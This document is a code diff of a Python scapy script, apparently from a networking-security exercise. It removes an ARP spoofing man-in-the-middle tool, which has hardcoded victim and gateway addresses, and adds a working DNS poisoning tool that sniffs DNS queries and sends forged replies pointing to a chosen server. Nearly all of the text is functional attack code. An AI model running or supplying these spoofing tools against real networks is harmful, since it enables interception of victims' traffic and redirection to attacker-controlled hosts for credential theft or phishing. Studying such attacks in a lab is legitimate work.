@@ -1,41 +1,32 @@
 #!/usr/local/bin/python
 
 '''
-ARP MitM
+Create a DNS poisoning tool similar to Dnsspoof using scapy
 '''
 
-# Good overview of ARP Spoofing
-# https://toschprod.wordpress.com/2012/01/20/mitm-3-arp-spoofing/
-# Review the table at the bottom, create ARP packets w/ the appropriate SPA, THA, and TPA values.
-# SHA value will be automatically by scapy
+# Good for finding DNS "magic numbers"
+# https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml
 
-### BEFORE (gateway and attacker hw address are the different) ####
-# $  sudo arp -a
-# ? (192.168.1.1) at d8:50:e6:59:93:a8 on en0 ifscope [ethernet]
-# ? (192.168.1.4) at a8:20:66:35:37:96 on en0 ifscope permanent [ethernet]
-# ? (192.168.1.223) at 8:0:27:a:8f:1b on en0 ifscope [ethernet]
+# Good for understanding the DNS packet structure
+# http://blog.catchpoint.com/2014/07/09/dissecting-dns-communications/
 
-### AFTER (gateway and attacker hw address are the same) ### 
-# $  sudo arp -a
-# ? (192.168.1.1) at 8:0:27:a:8f:1b on en0 ifscope [ethernet]
-# ? (192.168.1.4) at a8:20:66:35:37:96 on en0 ifscope permanent [ethernet]
-# ? (192.168.1.223) at 8:0:27:a:8f:1b on en0 ifscope [ethernet]
+# General DNS info (didn't use as much from this resource, but worth a glance)
+# http://www.zytrax.com/books/dns/ch8/
 
+# Sample Query
+# https://gist.github.com/thepacketgeek/6928674
 
 from scapy.all import *
 
-attacker = ("192.168.1.223", "08:00:27:a:8f:1b")
-victim = ("192.168.1.4", "a8:20:66:35:37:96 ")
-gateway = ("192.168.1.1", "d8:50:e6:59:93:a8")
+fake_DNS = "192.168.1.223" # this is the IP of the computer running this script
+fake_server = "192.168.2.30" # this is the reply to the DNS query
 
-def ARP_MitM(pkt):
-    # opcode 2 is 'reply'
-    # https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml#arp-parameters-1
-    spoof_victim = ARP(op=2, psrc=gateway[0], pdst=victim[0], hwdst=victim[1])
-    spoof_gateway = ARP(op=2, psrc=victim[0], pdst=gateway[0], hwdst=gateway[1])
+def DNS_spoof(pkt):
+	# http://www.unixwiz.net/images/dns-packet-exchange-step4.gif
+	if(pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[DNS].qdcount == 1):
+		# basically just flip all the necessary fields from source to response
+		response_pkt = IP(dst=pkt[IP].src)/UDP(sport=53, dport=pkt[UDP].sport)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=fake_server))
+		print(response_pkt.show())
+		send(response_pkt)
 
-    send(spoof_victim)#, verbose=0)
-    send(spoof_gateway)#, verbose=0)
-
-# Filter anything that isn't 
-sniff(iface="enp0s3", prn=ARP_MitM, filter="arp and host {} or host {}".format(gateway[0], victim[0]), count=10, store=0)
+sniff(iface="enp0s3", filter="udp port 53 and ip dst {} and not ip src {}".format(fake_DNS,fake_DNS), prn=DNS_spoof, store=0)
